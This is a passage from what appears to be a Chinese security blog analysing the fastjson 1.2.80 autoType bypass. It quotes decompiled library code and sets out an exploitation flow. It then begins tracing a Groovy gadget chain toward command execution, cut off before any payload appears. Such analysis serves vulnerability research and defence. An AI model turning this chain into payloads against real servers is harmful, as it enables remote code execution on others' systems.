<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                        &#125;<br><br>                        <span class="hljs-type">JavaBeanInfo</span> <span class="hljs-variable">beanInfo</span> <span class="hljs-operator">=</span> JavaBeanInfo.build(clazz, clazz, <span class="hljs-built_in">this</span>.propertyNamingStrategy);<br>                        <span class="hljs-keyword">if</span> (beanInfo.creatorConstructor != <span class="hljs-literal">null</span> &amp;&amp; autoTypeSupport) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                            TypeUtils.addMapping(typeName, clazz);<br>                        &#125;<br><br>                        <span class="hljs-keyword">return</span> clazz;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>1.2.73中修改JavaBeanDeserializer#createInstance()方法，修改之前对类属性恢复的需要属性必须有Annotation，修改后类属性与显示指定的类不相同和拥有注解两者只需满足一个即可，而显示指定的类可以不传置为null</p><p><img src="/image/0ad2638f-0407-470d-9c2c-9384bb556be3.png" alt="image-20220922101838051"></p><p>实例化类属性后，fastjson就会将其加入到反序列化缓存TypeUtils.mappings中，之后对类反序列化时，就会从缓存中获取类</p><p>MiscCodec#deserialz()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">deserialze</span><span class="hljs-params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> &#123;<br>    <span class="hljs-type">JSONLexer</span> <span class="hljs-variable">lexer</span> <span class="hljs-operator">=</span> parser.lexer;<br>    String className;<br>    <span class="hljs-keyword">if</span> (clazz == InetSocketAddress.class) &#123;<br>......<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        Object objVal;<br>        <span class="hljs-keyword">if</span> (parser.resolveStatus == <span class="hljs-number">2</span>) &#123;<br>......<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (!(objVal <span class="hljs-keyword">instanceof</span> String)) &#123;<br>                <span class="hljs-keyword">if</span> (objVal <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>                    <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> (JSONObject)objVal;<br>                    <span class="hljs-keyword">if</span> (clazz == Currency.class) &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">currency</span> <span class="hljs-operator">=</span> jsonObject.getString(<span class="hljs-string">&quot;currency&quot;</span>);<br>                        <span class="hljs-keyword">if</span> (currency != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">return</span> Currency.getInstance(currency);<br>                        &#125;<br><br>                        <span class="hljs-type">String</span> <span class="hljs-variable">symbol</span> <span class="hljs-operator">=</span> jsonObject.getString(<span class="hljs-string">&quot;currencyCode&quot;</span>);<br>                        <span class="hljs-keyword">if</span> (symbol != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">return</span> Currency.getInstance(symbol);<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (clazz == Map.Entry.class) &#123;<br>                        <span class="hljs-keyword">return</span> jsonObject.entrySet().iterator().next();<br>                    &#125;<br><br>                    <span class="hljs-keyword">return</span> jsonObject.toJavaObject(clazz);<br>                &#125;<br><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;expect string&quot;</span>);<br>            &#125;<br><br>            strVal = (String)objVal;<br>        &#125;<br>        ......<br></code></pre></td></tr></table></figure><p>JSONObject#toJavaObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">toJavaObject</span><span class="hljs-params">(Type type)</span> &#123;<br>    <span class="hljs-keyword">return</span> TypeUtils.cast(<span class="hljs-built_in">this</span>, type, ParserConfig.getGlobalInstance());<br>&#125;<br></code></pre></td></tr></table></figure><p>TypeUtils#cast()</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">cast</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> obj, Type <span class="hljs-keyword">type</span>, ParserConfig mapping</span>) &#123;<br>    <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Class</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">cast</span>(obj, (<span class="hljs-title class_">Class</span>)<span class="hljs-keyword">type</span>, mapping);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">ParameterizedType</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">cast</span>(obj, (<span class="hljs-title class_">ParameterizedType</span>)<span class="hljs-keyword">type</span>, mapping);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">String</span>) &#123;<br>            <span class="hljs-title class_">String</span> strVal = (<span class="hljs-title class_">String</span>)obj;<br>            <span class="hljs-keyword">if</span> (strVal.<span class="hljs-title function_">length</span>() == <span class="hljs-number">0</span> || <span class="hljs-string">&quot;null&quot;</span>.<span class="hljs-title function_">equals</span>(strVal) || <span class="hljs-string">&quot;NULL&quot;</span>.<span class="hljs-title function_">equals</span>(strVal)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">TypeVariable</span>) &#123;<br>            <span class="hljs-keyword">return</span> obj;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSON</span>Exception(<span class="hljs-string">&quot;can not cast to : &quot;</span> + <span class="hljs-keyword">type</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>TypeUtils#catToJavaBen()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">castToJavaBean</span><span class="hljs-params">(Map&lt;String, Object&gt; map, Class&lt;T&gt; clazz, ParserConfig config)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        String className;<br>        String language;<br>        <span class="hljs-keyword">if</span> (clazz == StackTraceElement.class) &#123;<br>......<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> map.get(JSON.DEFAULT_TYPE_KEY);<span class="hljs-comment">//获取@type,故格式需为&quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;xxxx.xxxxx&quot;</span><br>            <span class="hljs-keyword">if</span> (arg0 <span class="hljs-keyword">instanceof</span> String) &#123;<br>                className = (String)arg0;<br>                <span class="hljs-keyword">if</span> (config == <span class="hljs-literal">null</span>) &#123;<br>                    config = ParserConfig.global;<br>                &#125;<br><br>                Class&lt;?&gt; loadClazz = config.checkAutoType(className, (Class)<span class="hljs-literal">null</span>);<br>                <span class="hljs-keyword">if</span> (loadClazz == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNotFoundException</span>(className + <span class="hljs-string">&quot; not found&quot;</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (!loadClazz.equals(clazz)) &#123;<br>                    <span class="hljs-keyword">return</span> castToJavaBean(map, loadClazz, config);<br>                &#125;<br>            &#125;<br><br>            JSONObject jsonObject;<br>            ObjectDeserializer deserializer;<br>            <span class="hljs-keyword">if</span> (clazz.isInterface()) &#123;<br>                <span class="hljs-keyword">if</span> (map <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>                    jsonObject = (JSONObject)map;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    jsonObject = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(map);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (config == <span class="hljs-literal">null</span>) &#123;<br>                    config = ParserConfig.getGlobalInstance();<br>                &#125;<br><br>                deserializer = config.get(clazz);<br>                <span class="hljs-keyword">if</span> (deserializer != <span class="hljs-literal">null</span>) &#123;<br>                    language = JSON.toJSONString(jsonObject);<br>                    <span class="hljs-keyword">return</span> JSON.parseObject(language, clazz);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;clazz&#125;, jsonObject);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (clazz == Locale.class) &#123;<br>                    arg0 = map.get(<span class="hljs-string">&quot;language&quot;</span>);<br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">arg1</span> <span class="hljs-operator">=</span> map.get(<span class="hljs-string">&quot;country&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (arg0 <span class="hljs-keyword">instanceof</span> String) &#123;<br>                        language = (String)arg0;<br>                        <span class="hljs-keyword">if</span> (arg1 <span class="hljs-keyword">instanceof</span> String) &#123;<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">country</span> <span class="hljs-operator">=</span> (String)arg1;<br>                            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Locale</span>(language, country);<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (arg1 == <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Locale</span>(language);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz == String.class &amp;&amp; map <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>                    <span class="hljs-keyword">return</span> map.toString();<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == JSON.class &amp;&amp; map <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>                    <span class="hljs-keyword">return</span> map;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (clazz == LinkedHashMap.class &amp;&amp; map <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>                        jsonObject = (JSONObject)map;<br>                        Map&lt;String, Object&gt; innerMap = jsonObject.getInnerMap();<br>                        <span class="hljs-keyword">if</span> (innerMap <span class="hljs-keyword">instanceof</span> LinkedHashMap) &#123;<br>                            <span class="hljs-keyword">return</span> innerMap;<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (clazz.isInstance(map)) &#123;<br>                        <span class="hljs-keyword">return</span> map;<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == JSONObject.class) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(map);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">if</span> (config == <span class="hljs-literal">null</span>) &#123;<br>                            config = ParserConfig.getGlobalInstance();<br>                        &#125;<br><br>                        <span class="hljs-type">JavaBeanDeserializer</span> <span class="hljs-variable">javaBeanDeser</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                        deserializer = config.getDeserializer(clazz);<br>                        <span class="hljs-keyword">if</span> (deserializer <span class="hljs-keyword">instanceof</span> JavaBeanDeserializer) &#123;<br>                            javaBeanDeser = (JavaBeanDeserializer)deserializer;<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (javaBeanDeser == <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;can not get javaBeanDeserializer. &quot;</span> + clazz.getName());<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-keyword">return</span> javaBeanDeser.createInstance(map, config);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(var8.getMessage(), var8);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>利用流程：</p><ol><li><p>指定显式期望类，实例化XXXException并被加入类缓存</p></li><li><p>通过XXXException中可控的属性名&#x2F;参数名，由隐式类间关系实例化并被加入类缓存</p></li><li><p>直接从缓存中拿出来用，或者进一步递归让其它类被加入到缓存</p></li></ol><h4 id="PAYLOAD-10"><a href="#PAYLOAD-10" class="headerlink" title="PAYLOAD:"></a>PAYLOAD:</h4><p>1.2.68及1.2.80版本均需要相应依赖库方可造成危害，漏洞危害大大减少，payload根据浅蓝师傅分享payload进行分析</p><h6 id="Gadget-groovy命令执行"><a href="#Gadget-groovy命令执行" class="headerlink" title="Gadget:groovy命令执行"></a>Gadget:groovy命令执行</h6><p>依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.codehaus.groovy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>groovy<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>利用链分析：</p><p>org.codehaus.groovy.control.CompilationFailedException类继承Exction可通过校验，构造方法int phase, ProcessingUnit unit, Throwable cause三个参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">CompilationFailedException</span><span class="hljs-params">(<span class="hljs-type">int</span> phase, ProcessingUnit unit, Throwable cause)</span> &#123;<br>    <span class="hljs-built_in">super</span>(Phases.getDescription(phase) + <span class="hljs-string">&quot; failed&quot;</span>, cause);<br>    <span class="hljs-built_in">this</span>.phase = phase;<br>    <span class="hljs-built_in">this</span>.unit = unit;<br>&#125;<br></code></pre></td></tr></table></figure><p>org.codehaus.groovy.control.ProcessingUnit类，setClassLoader()方法调用new GroovyClassLoader(parent, this.getConfiguration())</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ProcessingUnit</span><span class="hljs-params">(CompilerConfiguration configuration, GroovyClassLoader classLoader, ErrorCollector errorCollector)</span> &#123;<br>    <span class="hljs-built_in">this</span>.setConfiguration(configuration != <span class="hljs-literal">null</span> ? configuration : CompilerConfiguration.DEFAULT);<br>    <span class="hljs-built_in">this</span>.setClassLoader(classLoader);<br>    <span class="hljs-built_in">this</span>.errorCollector = errorCollector != <span class="hljs-literal">null</span> ? errorCollector : <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorCollector</span>(<span class="hljs-built_in">this</span>.getConfiguration());<br>    <span class="hljs-built_in">this</span>.configure(<span class="hljs-built_in">this</span>.getConfiguration());<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(CompilerConfiguration configuration)</span> &#123;<br>    <span class="hljs-built_in">this</span>.setConfiguration(configuration);<br>&#125;<br><br><span class="hljs-keyword">public</span> CompilerConfiguration <span class="hljs-title function_">getConfiguration</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.configuration;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setConfiguration</span><span class="hljs-params">(CompilerConfiguration configuration)</span> &#123;<br>    <span class="hljs-built_in">this</span>.configuration = (CompilerConfiguration)Objects.requireNonNull(configuration);<br>&#125;<br><br><span class="hljs-keyword">public</span> GroovyClassLoader <span class="hljs-title function_">getClassLoader</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.classLoader;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setClassLoader</span><span class="hljs-params">(GroovyClassLoader loader)</span> &#123;<br>    <span class="hljs-built_in">this</span>.classLoader = loader != <span class="hljs-literal">null</span> ? loader : (GroovyClassLoader)AccessController.doPrivileged(() -&gt; &#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>        <span class="hljs-keyword">if</span> (parent == <span class="hljs-literal">null</span>) &#123;<br>            parent = ProcessingUnit.class.getClassLoader();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyClassLoader</span>(parent, <span class="hljs-built_in">this</span>.getConfiguration());<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>GroovyClassLoader构造方法中 this.addClasspath(path);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">GroovyClassLoader</span><span class="hljs-params">(ClassLoader parent, CompilerConfiguration config, <span class="hljs-type">boolean</span> useConfigurationClasspath)</span> &#123;<br>    <span class="hljs-built_in">super</span>(EMPTY_URL_ARRAY, parent);<br>    <span class="hljs-built_in">this</span>.classCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnlimitedConcurrentCache</span>();<br>    <span class="hljs-built_in">this</span>.sourceCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StampedCommonCache</span>();<br>    <span class="hljs-built_in">this</span>.resourceLoader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyResourceLoader</span>() &#123;<br>        <span class="hljs-keyword">public</span> URL <span class="hljs-title function_">loadGroovySource</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> MalformedURLException &#123;<br>            <span class="hljs-keyword">return</span> (URL)AccessController.doPrivileged(() -&gt; &#123;<br>                <span class="hljs-type">Iterator</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> GroovyClassLoader.<span class="hljs-built_in">this</span>.config.getScriptExtensions().iterator();<br><br>                <span class="hljs-keyword">while</span>(var2.hasNext()) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">extension</span> <span class="hljs-operator">=</span> (String)var2.next();<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">URL</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> GroovyClassLoader.<span class="hljs-built_in">this</span>.getSourceFile(filename, extension);<br>                        <span class="hljs-keyword">if</span> (ret != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">return</span> ret;<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">catch</span> (Throwable var5) &#123;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;);<br>        &#125;<br>    &#125;;<br>    <span class="hljs-keyword">if</span> (config == <span class="hljs-literal">null</span>) &#123;<br>        config = CompilerConfiguration.DEFAULT;<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.config = config;<br>    <span class="hljs-keyword">if</span> (useConfigurationClasspath) &#123;<br>        <span class="hljs-type">Iterator</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> config.getClasspath().iterator();<br><br>        <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> (String)var4.next();<br>            <span class="hljs-built_in">this</span>.addClasspath(path);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.initSourceEncoding(config);<br>&#125;<br></code></pre></td></tr></table></figure><p>JavaStubCompilationUnit继承ProcessingUnit类，构造方法如下中调用addPhaseOperation()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">JavaStubCompilationUnit</span><span class="hljs-params">(CompilerConfiguration config, GroovyClassLoader gcl, File destDir)</span> &#123;<br>    <span class="hljs-built_in">super</span>(config, (CodeSource)<span class="hljs-literal">null</span>, gcl);<br>    <span class="hljs-keyword">if</span> (destDir == <span class="hljs-literal">null</span>) &#123;<br>        Map&lt;String, Object&gt; options = <span class="hljs-built_in">this</span>.configuration.getJointCompilationOptions();<br>        destDir = (File)options.get(<span class="hljs-string">&quot;stubDir&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">useJava5</span> <span class="hljs-operator">=</span> CompilerConfiguration.isPostJDK5(<span class="hljs-built_in">this</span>.configuration.getTargetBytecode());<br>    <span class="hljs-type">String</span> <span class="hljs-variable">encoding</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.configuration.getSourceEncoding();<br>    <span class="hljs-built_in">this</span>.stubGenerator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaStubGenerator</span>(destDir, <span class="hljs-literal">false</span>, useJava5, encoding);<br>    <span class="hljs-built_in">this</span>.addPhaseOperation((source, context, classNode) -&gt; &#123;<br>        (<span class="hljs-keyword">new</span> <span class="hljs-title class_">VariableScopeVisitor</span>(source)).visitClass(classNode);<br>        (<span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaAwareResolveVisitor</span>(<span 